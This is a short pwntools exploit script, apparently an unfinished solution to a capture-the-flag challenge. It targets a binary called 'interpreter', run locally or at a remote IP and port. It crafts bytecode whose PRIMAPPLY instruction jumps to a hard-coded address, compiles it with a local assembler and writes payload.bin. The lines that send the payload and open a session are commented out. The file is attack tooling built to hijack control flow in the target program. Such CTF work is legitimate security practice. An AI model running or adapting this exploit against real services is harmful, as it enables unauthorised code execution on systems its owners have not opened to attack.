#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('interpreter', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x0800804F
        b*0x00800802C
        b*0x08008082 
        b*0x08008118 
        b*0x0080087EE  
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('143.198.163.4', 1901)
else:
    p = process([exe.path])
# GDB()

asm_code = flat(
    b"LOAD NULL\n"
    b"LOAD 0\n"
    b"LOAD 0\n"
    b"PRIMAPPLY 0x08008574\n"
    b"DONE"
)
# sl(asm_code)

# =========================================================
# 2. Compile using main.py and save to payload.bin
# =========================================================
log.info("Compiling assembly via main.py...")

# Start the assembler process (adjust path if needed)
assembler = process(["python3", "src/assembler/main.py"])
# Send the text and read the raw compiled bytes back
assembler.send(asm_code)
compiled_payload = assembler.recvall()
assembler.close()

# # Save it to a file exactly as you requested
with open("payload.bin", "wb") as f:
    f.write(compiled_payload)
    
log.success(f"Saved {len(compiled_payload)} bytes to payload.bin")

# p.interactive()
